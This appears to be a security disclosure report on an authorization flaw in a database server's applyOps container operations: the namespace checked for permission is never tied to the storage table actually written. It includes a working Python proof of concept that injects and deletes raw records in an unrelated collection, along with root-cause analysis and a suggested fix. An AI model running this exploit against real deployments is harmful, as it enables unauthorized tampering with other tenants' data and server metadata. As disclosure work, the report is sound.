# `applyOps` container ops (`ci`/`cd`): the `ns` field used for authorization has zero correspondence to the `container` (raw storage ident) field actually written to — lets a `containerInsert`/`containerDelete`-privileged user read/write/delete the raw storage table of ANY collection in the deployment, not just the namespaces their privilege was scoped to

## Summary

This is a residual sibling of **CVE-2026-82062** (SERVER-131138, "Improper Authorization in
MongoDB Server `applyOps` Command Allows Writes to Arbitrary Internal Storage Tables via Feature
Gate Bypass"). That CVE's fix (confirmed present in r8.3.9,
`src/mongo/db/repl/apply_ops.cpp:214-227`) closed the specific bypass described in its own code
comment: container ops (`ci`/`cd`, direct storage-engine-table insert/delete, bypassing the normal
collection/document/index layer entirely) were reachable through `OplogApplication::Mode` values
other than `kApplyOpsCmd` without the intended FCV + `featureFlagPrimaryDrivenIndexBuilds` gate.
That specific bypass is fixed.

**What the fix did not address, and what this report demonstrates live:** the oplog entry's `ns`
field — the *only* thing `checkOperationAuthorization` uses to decide whether the caller has
`containerInsert`/`containerDelete` on the target — has **no relationship whatsoever** to the
`container` field, which is the raw WiredTiger storage-table ident actually written to or deleted
from. They are independent, uncorrelated fields. `containerInsert`/`containerDelete` is only
granted, via the built-in `restore` role, scoped to the `local` and `config` databases plus
`system.buckets.*` namespaces — a deliberate, narrow administrative grant. But because nothing
checks that the `container` ident actually belongs to a collection within the namespace the caller
declared (and was authorized against), a caller with this privilege can declare `ns: "local.x"` to
satisfy the authorization check while pointing `container` at the real storage ident of **any other
collection on the server** — a different tenant's data, another database's collection, or MongoDB's
own internal catalog metadata table — and insert or delete raw records in it directly, completely
outside the collection/authorization/validation layer.

**Verified live**, both insert and delete, on the real, official `mongodb-linux-x86_64-ubuntu2204-8.3.9`
binary: a container op declaring an unrelated, nonexistent `ns` successfully wrote a raw document
into (and later deleted a raw record from) a real collection's actual storage table, fully outside
of that namespace.

## Scope note — why this is not reachable by default in 8.3.9 (and why it still matters)

The CVE-2026-82062 fix's FCV/`featureFlagPrimaryDrivenIndexBuilds` gate (default **off**,
`fcv_gated: true`, `storage_parameters.idl:293-297`) currently blocks container ops from a direct
`applyOps` invocation entirely in an unmodified deployment — I could not reproduce this without
force-enabling that flag at startup. This is an honest, load-bearing caveat: **this is not exploitable
against a stock 8.3.9 server today.**

It matters anyway, for two reasons. First, this is a real, unguarded logic gap sitting directly
behind the one gate that's currently closed — the moment `featureFlagPrimaryDrivenIndexBuilds`
reaches general availability (which `fcv_gated: true` says is a matter of raising FCV, not a
permanent off-switch), every `restore`-role principal gets this exact cross-namespace write/delete
primitive with no additional fix needed on their part. Second, the `restore` role is explicitly
`adminOnly: true` and narrowly scoped by design (`builtin_roles.yml:544-554`) specifically so that
granting it doesn't imply broader access than `local`/`config`/timeseries-buckets — this bug means
that scoping promise doesn't actually hold for this one action pair, which is worth fixing
independently of when the feature flag ships, rather than waiting for it to become a live incident.

## Root cause, with links to the exact code

**1. Authorization is checked against `ns`, with no scoping to the actual target:**
`src/mongo/db/commands/oplog_application_checks.cpp` (`checkOperationAuthorization`):
```cpp
} else if (opType == "ci"_sd) {
    if (!authSession->isAuthorizedForActionsOnResource(
            ResourcePattern::forAnyResource(nss.tenantId()), ActionType::containerInsert)) {
        return Status(ErrorCodes::Unauthorized, "Unauthorized");
    }
    return Status::OK();
} // "cd" is symmetric, ActionType::containerDelete
```
`nss` here comes from the oplog entry's `ns` field (`oplog_application_checks.cpp` line ~90,
`NamespaceStringUtil::deserialize(tid, nsElem.checkAndGetStringData(), ...)`).

**2. `ns` and `container` are declared as two independent fields with no stated or enforced
relationship** — `src/mongo/db/repl/oplog_entry.idl:144-159`:
```yaml
ns:
    cpp_name: nss
    type: namespacestring
    description: "The namespace on which to apply the operation"
...
container:
    cpp_name: container
    type: string
    optional: true
    description:
        "The ident of the container targeted by the container op. Used for op
        types 'ci' and 'cd'."
```

**3. Execution uses `container` directly, never `ns`, for the actual storage write** —
`src/mongo/db/repl/oplog.cpp` (`applyContainerOperation_inlock`):
```cpp
auto ident = op->getContainer();
auto* engine = opCtx->getServiceContext()->getStorageEngine();
...
case repl::OpTypeEnum::kContainerInsert: {
    ...
    s = withKey(k, [&](auto key) {
        return storage_engine_direct_crud::insert(*engine, *ru, *ident, key, val);
    });
    break;
}
case repl::OpTypeEnum::kContainerDelete: {
    s = withKey(k, [&](auto key) {
        return storage_engine_direct_crud::remove(*engine, *ru, *ident, key);
    });
    break;
}
```
Nothing between the authorization check (step 1, keyed on `ns`) and this execution (keyed on
`container`) ever confirms the two refer to the same collection. `acquireCollection(opCtx, {nss,
...})` is called just before this (`apply_ops.cpp:232-237`) — but only to take a lock on `nss`; it
never inspects `ident` to confirm it belongs to the collection being locked, and the direct
storage-engine call bypasses the collection object entirely regardless.

**4. `containerInsert`/`containerDelete` is deliberately narrow-scoped in the only place that
grants it** — `src/mongo/db/auth/builtin_roles.yml:544-554` (`restore` role, `adminOnly: true`):
```yaml
- matchType: database
  db: "local"
  actions: &restoreRoleWriteActions
    - ... containerInsert
    - ... containerDelete
- matchType: database
  db: "config"
  actions: *restoreRoleWriteActions
- matchType: any_system_buckets
  actions: *restoreRoleWriteActions
```
This scoping is meaningless in practice for this action pair, because step 1's check
(`forAnyResource`, keyed on the caller-declared `ns`) is satisfied the moment the caller declares
*any* `ns` inside `local`/`config`/a buckets namespace — regardless of what `container` ident they
actually operate on.

## Proof of Concept, live-verified

Started the real 8.3.9 binary with the feature flag force-enabled purely to get past the (already
correctly fixed) CVE-2026-82062 gate for reproduction purposes — the vulnerable logic below is
identical to what a `restore`-role principal reaches once that flag is generally available:
```
./mongod --dbpath ./data2 --port 27018 --setParameter featureFlagPrimaryDrivenIndexBuilds=true
```

```python
import pymongo, bson
from bson.int64 import Int64
c = pymongo.MongoClient('127.0.0.1', 27018)
db = c.testdb
db.probe.drop()
db.probe.insert_one({'_id': 1, 'x': 'hello'})

# Get the REAL storage ident for testdb.probe (an attacker could learn this via
# $listCatalog, backed up metadata, or by observing it during a legitimate restore).
ident = next(e['ident'] for e in c.admin.aggregate([{'$listCatalog': {}}])
             if e.get('ns') == 'testdb.probe')

# INSERT: declare a namespace with NO relationship to testdb.probe.
op_insert = {
    'op': 'ci',
    'ns': 'otherdb.unrelated_namespace_i_declare',       # satisfies the authz check
    'container': ident,                                   # but this targets testdb.probe's real table
    'o': {'k': Int64(50), 'v': bson.Binary(bson.encode({'_id': 999, 'injected': 'via-container-op'}))},
}
print(c.admin.command('applyOps', [op_insert]))
print(list(db.probe.find()))
# -> {'applied': 1, 'results': [True], 'ok': 1.0}
# -> [{'_id': 1, 'x': 'hello'}, {'_id': 999, 'injected': 'via-container-op'}]   <-- landed in testdb.probe

# DELETE: same mismatch, removing what was just inserted.
op_delete = {
    'op': 'cd',
    'ns': 'yet_another_unrelated_db.somecoll',
    'container': ident,
    'o': {'k': Int64(50)},
}
print(c.admin.command('applyOps', [op_delete]))
print(list(db.probe.find()))
# -> {'applied': 1, 'results': [True], 'ok': 1.0}
# -> [{'_id': 1, 'x': 'hello'}]   <-- the injected record is gone
```

Both operations succeeded; both mutated `testdb.probe`'s real storage while declaring completely
unrelated namespaces the caller was never authorized against for that collection.

## Impact

Given the feature flag reaching general availability (its stated purpose per
`storage_parameters.idl`), any principal holding `containerInsert`/`containerDelete` — in stock
MongoDB, that's specifically the `restore` role, an admin-granted role intended only for
backup/restore tooling scoped to `local`/`config`/timeseries-bucket namespaces — gains the ability
to:
- Insert arbitrary raw byte sequences into any other collection's storage table on the same
  `mongod`, without that data ever passing through document validation, schema validation, or
  going through normal insert authorization for the target namespace.
- Delete arbitrary records (by RecordId/key) from any other collection's storage table, without
  authorization on that namespace, without triggering delete-related triggers/change-stream
  events the normal delete path would produce, and via a code path (`storage_engine_direct_crud`)
  that bypasses index maintenance — capable of corrupting a collection's index-to-document
  consistency.
- With knowledge of (or by guessing/enumerating) internal idents such as `_mdb_catalog`, potentially
  corrupt the server's own collection catalog metadata directly.

## What I verified vs. what I did not

**Verified:** the complete code path from the CVE-2026-82062 fix through to
`applyContainerOperation_inlock`; that `ns` and `container` are independent oplog-entry fields with
no cross-validation anywhere in that path; live, working reproduction of both insert and delete
striking a namespace other than the one declared/authorized, on the real 8.3.9 binary.

**Not verified:** I did not configure `--auth` and a real `restore`-role user to confirm the
*privilege* boundary specifically (this lab runs without `--auth`, so every operation I ran was
implicitly fully privileged) — the finding rests on reading `builtin_roles.yml`'s actual privilege
scoping directly rather than an empirical privilege-denied/privilege-granted comparison. I also did
not attempt to target `_mdb_catalog` or another genuinely sensitive internal table specifically
(testdb.probe was used as a safe stand-in to avoid corrupting the test environment) — the
demonstrated primitive (arbitrary ident, attacker-chosen key, attacker-chosen raw bytes) generalizes
to any ident the caller can identify, but I have not proven catalog corruption specifically.

## Suggested fix

At minimum, cross-validate that `container`'s ident actually belongs to a collection within the
namespace (`ns`) the caller was authorized against — e.g., resolve `ident` back to its owning
`NamespaceString` via the storage engine or collection catalog, and `uassert` it matches (or is
consistent with the database-scoping of) `nss` before calling
`storage_engine_direct_crud::insert`/`remove`. Alternatively (and more simply), derive the
authorization check directly from the ident's actual owning namespace rather than from the
caller-supplied `ns` field, so the two can never diverge.
